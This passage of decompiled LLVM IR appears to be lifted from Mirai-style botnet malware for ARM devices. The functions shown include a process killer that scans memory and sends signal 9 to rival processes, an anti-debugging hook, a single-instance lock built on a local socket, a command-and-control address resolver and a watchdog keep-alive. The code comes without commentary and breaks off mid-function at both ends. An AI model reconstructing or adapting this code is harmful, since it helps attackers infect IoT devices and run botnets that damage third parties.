  %v3_d3d8 = call i32 @table_retrieve_val(i32 33, i32* %v2_d3d8)
  %v0_d3dc = load i32, i32* @r5, align 4
  %v1_d3dc = add i32 %v0_d3dc, -1
  store i32 %v1_d3dc, i32* @r1, align 4
  store i32 %v3_d3d8, i32* %r2.global-to-local, align 4
  %v4_d3e8 = call i32 @util_stristr(i8* %v2_d140, i32 %v1_d3dc, i32 %v3_d3d8)
  %v7_d3ec = icmp eq i32 %v4_d3e8, -1
  br i1 %v7_d3ec, label %dec_label_pc_d408, label %dec_label_pc_d3f4

dec_label_pc_d3f4:                                ; preds = %dec_label_pc_d3bc
  %v1_d3f8 = call i32 @unlink(i32 %v1_d130)
  %v0_d3fc = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d404 = call i32 @kill(i32 %v0_d3fc, i32 9)
  br label %dec_label_pc_d408

dec_label_pc_d408:                                ; preds = %dec_label_pc_d3bc, %dec_label_pc_d3f4
  %v1_d40c = call i32 @table_lock_val(i32 33)
  %v1_d410 = call i32 @__getpid(i32 %v1_d40c)
  store i32 %v1_d410, i32* @r0, align 4
  %v1_d414 = load i32, i32* @r7, align 4
  %v9_d414 = icmp eq i32 %v1_d410, %v1_d414
  br i1 %v9_d414, label %dec_label_pc_d440, label %dec_label_pc_d41c

dec_label_pc_d41c:                                ; preds = %dec_label_pc_d408
  %v0_d41c = call i32 @getppid()
  %v1_d420 = load i32, i32* @r7, align 4
  %v9_d420 = icmp eq i32 %v0_d41c, %v1_d420
  br i1 %v9_d420, label %dec_label_pc_d440, label %dec_label_pc_d428

dec_label_pc_d428:                                ; preds = %dec_label_pc_d41c
  %v2_d430 = load i32, i32* @global_var_24720.78, align 4
  store i32 %v2_d430, i32* %r1.global-to-local, align 4
  %v3_d434 = call i32 @util_strcmp(i8* %v2_d140, i32 %v2_d430)
  %v2_d438 = icmp eq i32 %v3_d434, 0
  br i1 %v2_d438, label %dec_label_pc_d44c, label %dec_label_pc_d428.dec_label_pc_d440_crit_edge

dec_label_pc_d428.dec_label_pc_d440_crit_edge:    ; preds = %dec_label_pc_d428
  %v0_d444.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d440

dec_label_pc_d440:                                ; preds = %dec_label_pc_d428.dec_label_pc_d440_crit_edge, %dec_label_pc_d41c, %dec_label_pc_d408
  %v0_d444 = phi i32 [ %v0_d444.pre, %dec_label_pc_d428.dec_label_pc_d440_crit_edge ], [ %v0_d41c, %dec_label_pc_d41c ], [ %v1_d410, %dec_label_pc_d408 ]
  store i32 %v2_d2d0, i32* @r4, align 4
  store i32 %v0_d444, i32* @r5, align 4
  br label %dec_label_pc_d220.backedge

dec_label_pc_d220.backedge:                       ; preds = %dec_label_pc_d284, %dec_label_pc_d27c, %dec_label_pc_d230, %dec_label_pc_d440, %dec_label_pc_d618, %.thread10
  %stack_var_-8412.1.be = phi i32 [ %v1_d254, %dec_label_pc_d618 ], [ %v1_d254, %dec_label_pc_d440 ], [ %v1_d254, %.thread10 ], [ %stack_var_-8412.2, %dec_label_pc_d230 ], [ %v1_d254, %dec_label_pc_d27c ], [ %v1_d254, %dec_label_pc_d284 ]
  %v0_d220 = load i32, i32* @sb, align 4
  %v1_d224 = inttoptr i32 %v0_d220 to i32*
  %v2_d224 = call i32 @__GI_readdir(i32* %v1_d224)
  %v2_d228 = icmp eq i32 %v2_d224, 0
  br i1 %v2_d228, label %dec_label_pc_d2c0, label %dec_label_pc_d230.preheader

dec_label_pc_d44c:                                ; preds = %dec_label_pc_d428
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d454 = call i32 @__libc_open(i32 %v1_d130, i32 0)
  %v7_d458 = icmp eq i32 %v2_d454, -1
  store i32 %v2_d454, i32* @r4, align 4
  br i1 %v7_d458, label %bb161, label %.thread12

bb161:                                            ; preds = %dec_label_pc_d44c
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d44c, %bb161
  store i32 54380, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d458, i32 ptrtoint (i32* @global_var_10c60.80 to i32))
  %v0_d46c = load i32, i32* @r4, align 4
  %v1_d470 = call i32 @__GI___libc_close(i32 %v0_d46c)
  br label %dec_label_pc_d474

dec_label_pc_d474:                                ; preds = %dec_label_pc_d2cc, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d480 = call i32 @__libc_open(i32 %v2_d2fc, i32 0)
  %v7_d484 = icmp eq i32 %v2_d480, -1
  store i32 %v2_d480, i32* @fp, align 4
  br i1 %v7_d484, label %dec_label_pc_d618, label %dec_label_pc_d490

dec_label_pc_d490:                                ; preds = %dec_label_pc_d474
  %v1_d494 = call i32 @table_unlock_val(i32 20)
  %v1_d49c = call i32 @table_unlock_val(i32 21)
  %v1_d4a4 = call i32 @table_unlock_val(i32 22)
  store i32 %v2_d4ac, i32* %r1.global-to-local, align 4
  %v3_d4b4 = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v2_d4bc, i32* %r1.global-to-local, align 4
  store i32 %v3_d4b4, i32* @r6, align 4
  %v3_d4c8 = call i32 @table_retrieve_val(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v3_d4c8, i32* @r8, align 4
  store i32 %v2_d4d4, i32* %r1.global-to-local, align 4
  %v3_d4dc = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-52)
  store i32 %v3_d4dc, i32* @sl, align 4
  store i32 %v2_d4e8, i32* @r4, align 4
  %v0_d4ec76 = load i32, i32* @fp, align 4
  store i32 %v2_d4e8, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d4f877 = call i32 @__libc_read(i32 %v0_d4ec76)
  %tmp162 = icmp slt i32 %v1_d4f877, 1
  br i1 %tmp162, label %dec_label_pc_d64c, label %dec_label_pc_d504

dec_label_pc_d504:                                ; preds = %dec_label_pc_d490, %dec_label_pc_d4ec.backedge
  %v0_d55467 = phi i32 [ %v1_d4f8, %dec_label_pc_d4ec.backedge ], [ %v1_d4f877, %dec_label_pc_d490 ]
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  %v3_d508 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d508, i32* @r5, align 4
  %v5_d510 = icmp slt i32 %v0_d55467, %v3_d508
  br i1 %v5_d510, label %dec_label_pc_d520, label %dec_label_pc_d590.lr.ph

dec_label_pc_d590.lr.ph:                          ; preds = %dec_label_pc_d504
  %v1_d58850 = add i32 %v0_d55467, -1
  store i32 %v1_d58850, i32* %r1.global-to-local, align 4
  %v0_d590.pre = load i32, i32* @r6, align 4
  %v1_d594.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d590

dec_label_pc_d520:                                ; preds = %dec_label_pc_d588.backedge, %dec_label_pc_d504
  store i32 %v2_cf90, i32* %r2.global-to-local, align 4
  %v3_d524 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d524, i32* @r5, align 4
  %v5_d52c = icmp slt i32 %v0_d55467, %v3_d524
  br i1 %v5_d52c, label %dec_label_pc_d53c, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_d520
  %v1_d5bc59 = add i32 %v0_d55467, -1
  store i32 %v1_d5bc59, i32* %r1.global-to-local, align 4
  %v2_d5bc60 = icmp eq i32 %v0_d55467, 0
  br i1 %v2_d5bc60, label %dec_label_pc_d53c, label %dec_label_pc_d5c4.lr.ph

dec_label_pc_d5c4.lr.ph:                          ; preds = %.thread28
  %v0_d5c4.pre = load i32, i32* @r8, align 4
  %v1_d5c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d5c4

dec_label_pc_d53c:                                ; preds = %dec_label_pc_d5bc.backedge, %.thread28, %dec_label_pc_d520
  store i32 %v2_cf90, i32* @r3, align 4
  %v3_d540 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d540, i32* @lr, align 4
  %v5_d548 = icmp slt i32 %v0_d55467, %v3_d540
  br i1 %v5_d548, label %dec_label_pc_d4ec.backedge, label %.thread34

dec_label_pc_d4ec.backedge:                       ; preds = %dec_label_pc_d570, %.thread34, %dec_label_pc_d53c
  %v0_d4ec = load i32, i32* @fp, align 4
  store i32 %v2_d4e8, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d4f8 = call i32 @__libc_read(i32 %v0_d4ec)
  %tmp163 = icmp slt i32 %v1_d4f8, 1
  br i1 %tmp163, label %dec_label_pc_d64c, label %dec_label_pc_d504

.thread34:                                        ; preds = %dec_label_pc_d53c
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d55469 = icmp eq i32 %v0_d55467, 0
  br i1 %v2_d55469, label %dec_label_pc_d4ec.backedge, label %dec_label_pc_d55c.lr.ph

dec_label_pc_d55c.lr.ph:                          ; preds = %.thread34
  %v0_d55c.pre = load i32, i32* @sl, align 4
  %v1_d560.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d55c

dec_label_pc_d55c:                                ; preds = %dec_label_pc_d570, %dec_label_pc_d55c.lr.ph
  %v0_d554.in = phi i32 [ %v0_d55467, %dec_label_pc_d55c.lr.ph ], [ %v0_d554, %dec_label_pc_d570 ]
  %v0_d570 = phi i32 [ 0, %dec_label_pc_d55c.lr.ph ], [ %v1_d570, %dec_label_pc_d570 ]
  %v1_d55c = phi i32 [ 0, %dec_label_pc_d55c.lr.ph ], [ %v1_d55c116, %dec_label_pc_d570 ]
  %v0_d554 = add i32 %v0_d554.in, -1
  %v2_d55c = add i32 %v1_d55c, %v0_d55c.pre
  %v3_d55c = inttoptr i32 %v2_d55c to i8*
  %v4_d55c = load i8, i8* %v3_d55c, align 1
  %v6_d55c = zext i8 %v4_d55c to i32
  store i32 %v6_d55c, i32* %r2.global-to-local, align 4
  %v2_d560 = add i32 %v0_d570, %v1_d560.pre
  %v3_d560 = inttoptr i32 %v2_d560 to i8*
  %v4_d560 = load i8, i8* %v3_d560, align 1
  %v6_d560 = zext i8 %v4_d560 to i32
  store i32 %v6_d560, i32* @r3, align 4
  %v9_d564 = icmp eq i8 %v4_d560, %v4_d55c
  br i1 %v9_d564, label %dec_label_pc_d5e0, label %bb164

bb164:                                            ; preds = %dec_label_pc_d55c
  br label %dec_label_pc_d570

dec_label_pc_d570:                                ; preds = %bb164, %dec_label_pc_d5e0
  %v1_d55c116 = phi i32 [ %v1_d5e0, %dec_label_pc_d5e0 ], [ 0, %bb164 ]
  %v1_d570 = add i32 %v0_d570, 1
  store i32 %v1_d570, i32* %r1.global-to-local, align 4
  %v2_d554 = icmp eq i32 %v0_d554, 0
  br i1 %v2_d554, label %dec_label_pc_d4ec.backedge, label %dec_label_pc_d55c

dec_label_pc_d578:                                ; preds = %dec_label_pc_d590
  %v1_d578 = add i32 %v1_d590, 1
  store i32 %v1_d578, i32* @lr, align 4
  %v9_d57c = icmp eq i32 %v3_d508, %v1_d578
  br i1 %v9_d57c, label %dec_label_pc_d5ec, label %dec_label_pc_d588.backedge

dec_label_pc_d588.backedge:                       ; preds = %dec_label_pc_d578, %dec_label_pc_d5a4
  %v1_d59098 = phi i32 [ 0, %dec_label_pc_d5a4 ], [ %v1_d578, %dec_label_pc_d578 ]
  %storemerge86 = add i32 %storemerge86.in, 1
  %v1_d588 = add i32 %v0_d588, -1
  store i32 %v1_d588, i32* %r1.global-to-local, align 4
  %v2_d588 = icmp eq i32 %v0_d588, 0
  br i1 %v2_d588, label %dec_label_pc_d520, label %dec_label_pc_d590

dec_label_pc_d590:                                ; preds = %dec_label_pc_d588.backedge, %dec_label_pc_d590.lr.ph
  %v0_d588 = phi i32 [ %v1_d58850, %dec_label_pc_d590.lr.ph ], [ %v1_d588, %dec_label_pc_d588.backedge ]
  %storemerge86.in = phi i32 [ 0, %dec_label_pc_d590.lr.ph ], [ %storemerge86, %dec_label_pc_d588.backedge ]
  %v1_d590 = phi i32 [ 0, %dec_label_pc_d590.lr.ph ], [ %v1_d59098, %dec_label_pc_d588.backedge ]
  %v2_d590 = add i32 %v1_d590, %v0_d590.pre
  %v3_d590 = inttoptr i32 %v2_d590 to i8*
  %v4_d590 = load i8, i8* %v3_d590, align 1
  %v6_d590 = zext i8 %v4_d590 to i32
  store i32 %v6_d590, i32* %r2.global-to-local, align 4
  %v2_d594 = add i32 %storemerge86.in, %v1_d594.pre
  %v3_d594 = inttoptr i32 %v2_d594 to i8*
  %v4_d594 = load i8, i8* %v3_d594, align 1
  %v6_d594 = zext i8 %v4_d594 to i32
  store i32 %v6_d594, i32* %r3.global-to-local, align 4
  %v9_d598 = icmp eq i8 %v4_d594, %v4_d590
  br i1 %v9_d598, label %dec_label_pc_d578, label %dec_label_pc_d5a4

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d590
  br label %dec_label_pc_d588.backedge

dec_label_pc_d5ac:                                ; preds = %dec_label_pc_d5c4
  %v1_d5ac = add i32 %v1_d5c4, 1
  store i32 %v1_d5ac, i32* @lr, align 4
  %v9_d5b0 = icmp eq i32 %v3_d524, %v1_d5ac
  br i1 %v9_d5b0, label %dec_label_pc_d5ec, label %dec_label_pc_d5bc.backedge

dec_label_pc_d5bc.backedge:                       ; preds = %dec_label_pc_d5ac, %dec_label_pc_d5d8
  %v1_d5c4107 = phi i32 [ 0, %dec_label_pc_d5d8 ], [ %v1_d5ac, %dec_label_pc_d5ac ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_d5bc = add i32 %v0_d5bc, -1
  store i32 %v1_d5bc, i32* %r1.global-to-local, align 4
  %v2_d5bc = icmp eq i32 %v0_d5bc, 0
  br i1 %v2_d5bc, label %dec_label_pc_d53c, label %dec_label_pc_d5c4

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d5bc.backedge, %dec_label_pc_d5c4.lr.ph
  %v0_d5bc = phi i32 [ %v1_d5bc59, %dec_label_pc_d5c4.lr.ph ], [ %v1_d5bc, %dec_label_pc_d5bc.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_d5c4.lr.ph ], [ %storemerge, %dec_label_pc_d5bc.backedge ]
  %v1_d5c4 = phi i32 [ 0, %dec_label_pc_d5c4.lr.ph ], [ %v1_d5c4107, %dec_label_pc_d5bc.backedge ]
  %v2_d5c4 = add i32 %v1_d5c4, %v0_d5c4.pre
  %v3_d5c4 = inttoptr i32 %v2_d5c4 to i8*
  %v4_d5c4 = load i8, i8* %v3_d5c4, align 1
  %v6_d5c4 = zext i8 %v4_d5c4 to i32
  store i32 %v6_d5c4, i32* %r2.global-to-local, align 4
  %v2_d5c8 = add i32 %storemerge.in, %v1_d5c8.pre
  %v3_d5c8 = inttoptr i32 %v2_d5c8 to i8*
  %v4_d5c8 = load i8, i8* %v3_d5c8, align 1
  %v6_d5c8 = zext i8 %v4_d5c8 to i32
  store i32 %v6_d5c8, i32* %r3.global-to-local, align 4
  %v9_d5cc = icmp eq i8 %v4_d5c8, %v4_d5c4
  br i1 %v9_d5cc, label %dec_label_pc_d5ac, label %dec_label_pc_d5d8

dec_label_pc_d5d8:                                ; preds = %dec_label_pc_d5c4
  br label %dec_label_pc_d5bc.backedge

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d55c
  %v1_d5e0 = add i32 %v1_d55c, 1
  %v9_d5e4 = icmp eq i32 %v3_d540, %v1_d5e0
  br i1 %v9_d5e4, label %dec_label_pc_d5ec, label %dec_label_pc_d570

dec_label_pc_d5ec:                                ; preds = %dec_label_pc_d578, %dec_label_pc_d5ac, %dec_label_pc_d5e0
  %v1_d5f0 = call i32 @table_lock_val(i32 20)
  %v1_d5f8 = call i32 @table_lock_val(i32 21)
  %v1_d600 = call i32 @table_lock_val(i32 22)
  %v0_d604 = load i32, i32* @fp, align 4
  %v1_d608 = call i32 @__GI___libc_close(i32 %v0_d604)
  %v0_d60c = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d614 = call i32 @kill(i32 %v0_d60c, i32 9)
  br label %dec_label_pc_d618

dec_label_pc_d618:                                ; preds = %dec_label_pc_d474, %dec_label_pc_d64c, %dec_label_pc_d5ec
  store i32 %v2_d2fc, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d624 = call i32 @util_zero()
  store i32 %v2_d34c, i32* @r0, align 4
  store i32 64, i32* @r1, align 4
  %v0_d634 = call i32 @util_zero()
  %v1_d63c = call i32 @sleep(i32 1)
  store i32 %v2_d2d0, i32* @r4, align 4
  %v0_d644 = load i32, i32* @r7, align 4
  store i32 %v0_d644, i32* @r5, align 4
  br label %dec_label_pc_d220.backedge

dec_label_pc_d64c:                                ; preds = %dec_label_pc_d4ec.backedge, %dec_label_pc_d490
  %v1_d650 = call i32 @table_lock_val(i32 20)
  %v1_d658 = call i32 @table_lock_val(i32 21)
  %v1_d660 = call i32 @table_lock_val(i32 22)
  %v0_d664 = load i32, i32* @fp, align 4
  %v1_d668 = call i32 @__GI___libc_close(i32 %v0_d664)
  br label %dec_label_pc_d618

; uselistorder directives
  uselistorder i32 %v1_d5e0, { 1, 0 }
  uselistorder i32 %v1_d570, { 1, 0 }
  uselistorder i32 %v1_d55c, { 1, 0 }
  uselistorder i32 %v0_d570, { 1, 0 }
  uselistorder i32 %v1_d4f8, { 1, 0 }
  uselistorder i32 %v2_d480, { 1, 0 }
  uselistorder i1 %v7_d458, { 1, 0 }
  uselistorder i32 %v2_d454, { 1, 0 }
  uselistorder i32 %v2_d224, { 1, 0 }
  uselistorder i32 %stack_var_-8412.1.be, { 1, 0 }
  uselistorder i32 %v3_d3ac, { 1, 2, 0 }
  uselistorder i32 %v2_d2b4, { 1, 0 }
  uselistorder i32 %v1_d254, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_d230, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8412.0, { 1, 0 }
  uselistorder i32 %v2_d4e8, { 1, 0, 2 }
  uselistorder i32 %v2_d34c, { 1, 0, 2, 3 }
  uselistorder i32 %v2_d2fc, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_d1c8, { 1, 0 }
  uselistorder i32 %v2_d194, { 2, 0, 1 }
  uselistorder i32 %v3_d140, { 1, 0 }
  uselistorder i32 %v1_d130, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_d0b4, { 1, 2, 0 }
  uselistorder i32 %v3_d060, { 1, 2, 0 }
  uselistorder i32 %v3_d00c, { 1, 2, 0 }
  uselistorder i32 %v3_cfc0, { 1, 2, 0 }
  uselistorder i32 %storemerge126, { 1, 0 }
  uselistorder i32 %v0_cf54, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-68, { 1, 2, 3, 4, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 5, 4, 51, 1, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24720.78, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_24724.70, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d618, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d5ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d5bc.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d588.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_d570, { 1, 0 }
  uselistorder label %dec_label_pc_d504, { 1, 0 }
  uselistorder label %dec_label_pc_d474, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_d220.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_d408, { 1, 0 }
  uselistorder label %dec_label_pc_d230, { 1, 0 }
  uselistorder label %dec_label_pc_d230.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_d0e0, { 1, 0 }
  uselistorder label %dec_label_pc_d08c, { 1, 0 }
  uselistorder label %dec_label_pc_d038, { 1, 0 }
  uselistorder label %dec_label_pc_cfec, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_d7f8.82 to i32), i32* @global_var_21a90.84, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v9_d698 = load i32, i32* @r6, align 4
  %v12_d698 = load i32, i32* @r7, align 4
  %v15_d698 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_d6b4 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_21a88.86 to i32), i32* @r6, align 4
  %v7_d6bc = icmp eq i32 %v3_d6b4, -1
  store i32 %v3_d6b4, i32* @global_var_21a88.86, align 4
  br i1 %v7_d6bc, label %dec_label_pc_d774, label %dec_label_pc_d6c8

dec_label_pc_d6c8:                                ; preds = %entry
  %v2_d6c8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_d6c8, i32* @r3, align 4
  %v0_d6cc = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_d6dc = call i32 @__GI_setsockopt(i32 %v3_d6b4, i32 %v0_d6cc, i32 2, i32 %v2_d6c8, i32 4)
  %v2_d6e0 = load i32, i32* @global_var_21a88.86, align 4
  store i32 %v2_d6e0, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_d6f0 = call i32 @__libc_fcntl(i32 %v2_d6e0, i32 3)
  %v0_d6f4 = load i32, i32* @r5, align 4
  %v1_d6f8 = or i32 %v2_d6f0, 2048
  store i32 %v1_d6f8, i32* @r2, align 4
  %v0_d6fc = load i32, i32* @r4, align 4
  %v2_d700 = call i32 @__libc_fcntl(i32 %v0_d6fc, i32 %v0_d6f4)
  store i32 ptrtoint (i8** @global_var_21a94.88 to i32), i32* @r8, align 4
  %v2_d708 = load i8, i8* bitcast (i8** @global_var_21a94.88 to i8*), align 4
  %v2_d70c = icmp eq i8 %v2_d708, 0
  br i1 %v2_d70c, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_d6c8
  br label %bb20

bb:                                               ; preds = %dec_label_pc_d6c8
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_d730 = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_d738 = inttoptr i32 %v0_d730 to i32*
  store i32 0, i32* %v2_d738, align 4
  %v2_d73c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d73c, i32* @r5, align 4
  store i32 %v0_d730, i32* %r4.global-to-local, align 4
  %v2_d74c = load i32, i32* @global_var_21a88.86, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d758 = call i32 @bind(i32 %v2_d74c, i32 %v2_d73c, i32 16)
  %v7_d75c = icmp eq i32 %v3_d758, -1
  br i1 %v7_d75c, label %dec_label_pc_d780, label %dec_label_pc_d764

dec_label_pc_d764:                                ; preds = %bb20
  %v2_d76c = load i32, i32* @global_var_21a88.86, align 4
  %v2_d770 = call i32 @listen(i32 %v2_d76c, i32 1)
  br label %dec_label_pc_d774

dec_label_pc_d774:                                ; preds = %entry, %dec_label_pc_d78c, %dec_label_pc_d764
  %v1_d77c = phi i32 [ %v3_d6b4, %entry ], [ %v1_d7d0, %dec_label_pc_d78c ], [ %v2_d770, %dec_label_pc_d764 ]
  store i32 %v9_d698, i32* @r6, align 4
  store i32 %v12_d698, i32* @r7, align 4
  store i32 %v15_d698, i32* @r8, align 4
  ret i32 %v1_d77c

dec_label_pc_d780:                                ; preds = %bb20
  %v0_d780 = load i32, i32* %r4.global-to-local, align 4
  %v1_d780 = inttoptr i32 %v0_d780 to i32*
  %v2_d780 = load i32, i32* %v1_d780, align 4
  %v7_d784 = icmp eq i32 %v2_d780, 99
  br i1 %v7_d784, label %dec_label_pc_d7d8, label %dec_label_pc_d78c

dec_label_pc_d78c:                                ; preds = %dec_label_pc_d7d8, %bb21, %dec_label_pc_d780
  store i32 23815, i32* @r4, align 4
  %v2_d7a4 = load i32, i32* @global_var_21a88.86, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_d7b4 = call i32 @__libc_connect(i32 %v2_d7a4, i32 %v2_d73c, i32 16)
  %v1_d7bc = call i32 @sleep(i32 5)
  %v2_d7c0 = load i32, i32* @global_var_21a88.86, align 4
  %v1_d7c4 = call i32 @__GI___libc_close(i32 %v2_d7c0)
  %v0_d7c8 = load i32, i32* @r4, align 4
  %v1_d7cc = call i32 @killer_kill_by_port(i32 %v0_d7c8)
  %v1_d7d0 = call i32 @ensure_single_instance(i32 %v1_d7cc)
  br label %dec_label_pc_d774

dec_label_pc_d7d8:                                ; preds = %dec_label_pc_d780
  %v2_d7d8 = load i8, i8* bitcast (i8** @global_var_21a94.88 to i8*), align 4
  %v3_d7d8 = zext i8 %v2_d7d8 to i32
  %v1_d7dc = load i32, i32* @r7, align 4
  %v9_d7dc = icmp eq i32 %v3_d7d8, %v1_d7dc
  br i1 %v9_d7dc, label %dec_label_pc_d78c, label %bb21

bb21:                                             ; preds = %dec_label_pc_d7d8
  %v2_d7e4 = trunc i32 %v1_d7dc to i8
  store i8 %v2_d7e4, i8* bitcast (i8** @global_var_21a94.88 to i8*), align 4
  br label %dec_label_pc_d78c

; uselistorder directives
  uselistorder i32 %v2_d73c, { 1, 0, 2 }
  uselistorder i32 %v3_d6b4, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_21a94.88 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_21a94.88, { 1, 0 }
  uselistorder label %dec_label_pc_d78c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d774, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_d800 = call i32 @table_unlock_val(i32 1)
  store i32 ptrtoint ([15 x i8]* @global_var_1926c.91 to i32), i32* @r0, align 4
  %v2_d808 = call i32 @inet_addr(i32 ptrtoint ([15 x i8]* @global_var_1926c.91 to i32))
  store i32 ptrtoint (i16** @global_var_24728.93 to i32), i32* @r4, align 4
  store i32 %v2_d808, i32* @global_var_2472c.94, align 4
  %v3_d81c = call i32 @table_retrieve_val(i32 1, i32* null)
  %v4_d81c = inttoptr i32 %v3_d81c to i16*
  %v3_d820 = load i16, i16* %v4_d81c, align 2
  store i16 %v3_d820, i16* bitcast (i32* @global_var_2472a.95 to i16*), align 4
  %v1_d82c = call i32 @table_lock_val(i32 1)
  ret i32 %v1_d82c
}

define i32 @watchdog_maintain(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_d840 = load i32, i32* @r4, align 4
  %v6_d840 = load i32, i32* @r5, align 4
  %v0_d848 = call i32 @__libc_fork()
  %v7_d84c = icmp eq i32 %v0_d848, -1
  %. = zext i1 %v7_d84c to i32
  %tmp11 = icmp slt i32 %v0_d848, 1
  %storemerge4 = select i1 %tmp11, i32 %., i32 1
  store i32 %storemerge4, i32* @r5, align 4
  %v2_d868 = icmp eq i32 %storemerge4, 0
  store i32 %v0_d848, i32* @global_var_21c08.97, align 4
  br i1 %v2_d868, label %dec_label_pc_d880, label %dec_label_pc_d874

dec_label_pc_d874:                                ; preds = %entry
  store i32 %v3_d840, i32* @r4, align 4
  store i32 %v6_d840, i32* @r5, align 4
  ret i32 %v0_d848

dec_label_pc_d880:                                ; preds = %entry
  store i32 1, i32* %stack_var_-20, align 4
  %v1_d88c = call i32 @table_unlock_val(i32 26)
  %v1_d894 = call i32 @table_unlock_val(i32 27)
  %v0_d898 = load i32, i32* @r5, align 4
  %v2_d8a0 = inttoptr i32 %v0_d898 to i32*
  %v3_d8a0 = call i32 @table_retrieve_val(i32 26, i32* %v2_d8a0)
  %v2_d8a8 = call i32 @__libc_open(i32 %v3_d8a0, i32 2)
  %v7_d8ac = icmp eq i32 %v2_d8a8, -1
  store i32 %v2_d8a8, i32* @r4, align 4
  br i1 %v7_d8ac, label %dec_label_pc_d8f4, label %dec_label_pc_d8b8

dec_label_pc_d8b8:                                ; preds = %dec_label_pc_d8f4, %dec_label_pc_d880
  %v0_d8c4 = phi i32 [ %v2_d904, %dec_label_pc_d8f4 ], [ %v2_d8a8, %dec_label_pc_d880 ]
  %v2_d8c8 = ptrtoint i32* %stack_var_-20 to i32
  %v3_d8cc = call i32 @ioctl(i32 %v0_d8c4, i32 -2147199228, i32 %v2_d8c8)
  br label %dec_label_pc_d8d0

